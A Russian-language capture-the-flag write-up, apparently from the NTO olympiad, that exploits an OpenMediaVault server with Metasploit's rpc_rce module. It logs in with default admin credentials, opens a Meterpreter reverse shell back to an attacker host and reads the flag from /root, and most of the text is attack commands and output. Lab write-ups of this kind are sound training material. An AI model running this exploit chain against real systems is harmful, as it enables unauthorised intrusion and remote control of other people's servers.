## Шаг пепрвый.

Сразу же пошел гуглить `CVE` `RCE` на `openmediavault`

Нашел Exploit DB `https://www.exploit-db.com/exploits/29323` увидел что тут метасплоит.
И пошел дальше в него, вот все команды

```
┌──(kali㉿kaliOlymp)-[~/Документы/PoC-Cups-RCE-CVE-exploit-chain]
└─$ msfconsole
Metasploit tip: You can upgrade a shell to a Meterpreter session on many 
platforms using sessions -u <session_id>
                                                  
                                   ___          ____
                               ,-""   `.      < HONK >
                             ,'  _   e )`-._ /  ----                                                                                                                                           
                            /  ,' `-._<.===-'                                                                                                                                                  
                           /  /                                                                                                                                                                
                          /  ;                                                                                                                                                                 
              _          /   ;                                                                                                                                                                 
 (`._    _.-"" ""--..__,'    |                                                                                                                                                                 
 <_  `-""                     \                                                                                                                                                                
  <`-                          :                                                                                                                                                               
   (__   <__.                  ;                                                                                                                                                               
     `-.   '-.__.      _.'    /                                                                                                                                                                
        \      `-.__,-'    _,'                                                                                                                                                                 
         `._    ,    /__,-'                                                                                                                                                                    
            ""._\__,'< <____                                                                                                                                                                   
                 | |  `----.`.                                                                                                                                                                 
                 | |        \ `.                                                                                                                                                               
                 ; |___      \-``                                                                                                                                                              
                 \   --<                                                                                                                                                                       
                  `.`.<                                                                                                                                                                        
                    `-'                                                                                                                                                                        
                                                                                                                                                                                               
                                                                                                                                                                                               

       =[ metasploit v6.4.50-dev                          ]
+ -- --=[ 2496 exploits - 1283 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search openmediavault
[-] Unknown command: �ыsearch. Did you mean search? Run the help command for more details.
msf6 > search openmediavault

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/webapp/openmediavault_auth_cron_rce  2013-10-30       excellent  Yes    OpenMediaVault rpc.php Authenticated Cron Remote Code Execution
   1    \_ target: Unix Command                         .                .          .      .
   2    \_ target: Linux Dropper                        .                .          .      .
   3  exploit/unix/webapp/openmediavault_rpc_rce        2020-09-28       excellent  Yes    OpenMediaVault rpc.php Authenticated PHP Code Injection


Interact with a module by name or index. For example info 3, use 3 or use exploit/unix/webapp/openmediavault_rpc_rce

msf6 > use  exploit/unix/webapp/openmediavault_rpc_rce  
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/openmediavault_rpc_rce) > set LHOST 10.5.5.66
LHOST => 10.5.5.66
msf6 exploit(unix/webapp/openmediavault_rpc_rce) > set LPORT 41222
LPORT => 41222
msf6 exploit(unix/webapp/openmediavault_rpc_rce) > set RHOST 10.10.1.128
RHOST => 10.10.1.128
msf6 exploit(unix/webapp/openmediavault_rpc_rce) > set RPORT 80
RPORT => 80
msf6 exploit(unix/webapp/openmediavault_rpc_rce) > exploit
[*] Started reverse TCP handler on 10.5.5.66:41222 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] 10.10.1.128:80 - Authenticating with OpenMediaVault using admin:openmediavault...
[+] 10.10.1.128:80 - Successfully authenticated with OpenMediaVault using admin:openmediavault.
[*] 10.10.1.128:80 - Trying to detect if target is running a supported version of OpenMediaVault.
[+] 10.10.1.128:80 - Identified OpenMediaVault version 5.5.11.
[*] 10.10.1.128:80 - Verifying remote code execution by attempting to execute 'usleep()'.
[+] 10.10.1.128:80 - Response received after 11 seconds.
[+] The target is vulnerable.
[*] 10.10.1.128:80 - Sending payload (150 bytes)...
[*] Sending stage (1017704 bytes) to 10.5.5.252
[*] Meterpreter session 1 opened (10.5.5.66:41222 -> 10.5.5.252:30301) at 2025-03-27 15:53:03 +0300
ls
[*] Command Stager progress - 100.00% done (799/799 bytes)

meterpreter > ls
Listing: /
==========

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
040755/rwxr-xr-x  20480     dir   2025-03-25 12:25:43 +0300  bin
040755/rwxr-xr-x  4096      dir   2025-03-13 05:40:43 +0300  boot
040755/rwxr-xr-x  3260      dir   2025-03-24 19:49:19 +0300  dev
040775/rwxrwxr-x  4096      dir   2025-03-25 14:29:36 +0300  etc
040755/rwxr-xr-x  4096      dir   2020-09-18 00:21:10 +0300  export
040755/rwxr-xr-x  4096      dir   2020-07-11 00:04:00 +0300  home
100644/rw-r--r--  42872466  fil   2025-03-13 05:40:43 +0300  initrd.img
100644/rw-r--r--  42872466  fil   2025-03-13 05:40:43 +0300  initrd.img.old
040755/rwxr-xr-x  4096      dir   2025-03-13 05:40:12 +0300  lib
040755/rwxr-xr-x  4096      dir   2020-09-21 18:23:44 +0300  lib32
040755/rwxr-xr-x  4096      dir   2025-03-13 05:39:01 +0300  lib64
040755/rwxr-xr-x  4096      dir   2020-09-21 18:23:44 +0300  libx32
040700/rwx------  16384     dir   2025-03-13 05:38:20 +0300  lost+found
040755/rwxr-xr-x  4096      dir   2020-09-21 18:23:46 +0300  media
040755/rwxr-xr-x  4096      dir   2025-03-14 10:42:30 +0300  mnt
040755/rwxr-xr-x  4096      dir   2020-09-21 18:23:46 +0300  opt
040555/r-xr-xr-x  0         dir   2025-03-24 19:48:32 +0300  proc
040700/rwx------  4096      dir   2025-03-25 12:55:14 +0300  root
040755/rwxr-xr-x  1040      dir   2025-03-25 14:49:13 +0300  run
040755/rwxr-xr-x  16384     dir   2025-03-25 12:25:43 +0300  sbin
040755/rwxr-xr-x  4096      dir   2020-09-18 00:21:10 +0300  sharedfolders
040755/rwxr-xr-x  4096      dir   2025-03-19 03:07:40 +0300  srv
040555/r-xr-xr-x  0         dir   2025-03-24 19:48:32 +0300  sys
041777/rwxrwxrwx  2700      dir   2025-03-25 14:49:09 +0300  tmp
040755/rwxr-xr-x  4096      dir   2025-03-13 05:39:00 +0300  usr
040755/rwxr-xr-x  4096      dir   2025-03-13 05:39:01 +0300  var
100644/rw-r--r--  5630224   fil   2020-07-30 22:11:35 +0300  vmlinuz
100644/rw-r--r--  5630224   fil   2020-07-30 22:11:35 +0300  vmlinuz.old

meterpreter > cd /root/
meterpreter > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  1867  fil   2025-03-25 13:15:10 +0300  .bash_history
100600/rw-------  857   fil   2020-09-21 18:27:35 +0300  .bashrc
040700/rwx------  4096  dir   2025-03-13 08:56:49 +0300  .config
100600/rw-------  278   fil   2020-09-21 18:27:35 +0300  .inputrc
040755/rwxr-xr-x  4096  dir   2025-03-13 06:21:31 +0300  .local
100644/rw-r--r--  161   fil   2020-09-21 18:27:35 +0300  .profile
040700/rwx------  4096  dir   2025-03-13 06:22:04 +0300  .ssh
100644/rw-r--r--  180   fil   2025-03-13 06:26:19 +0300  .wget-hsts
100644/rw-r--r--  25    fil   2025-03-14 03:58:44 +0300  flag

meterpreter > cat flag
nto{4_l177l3_ch33ky_cv3}
meterpreter > 

```
